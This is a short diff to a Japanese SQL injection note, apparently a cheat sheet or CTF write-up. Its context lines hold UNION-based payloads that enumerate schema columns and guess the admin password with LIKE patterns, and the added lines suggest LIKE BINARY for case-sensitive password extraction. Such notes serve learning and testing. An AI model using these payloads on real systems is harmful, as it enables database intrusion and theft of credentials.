@@ -90,6 +90,11 @@ a' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='デー
 a' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
 ```
 
+```sql
+-- パスワード等、大文字小文字を区別する必要がある場合
+LIKE BINARY
+```
+
 サンプルスクリプト
 
 ```python
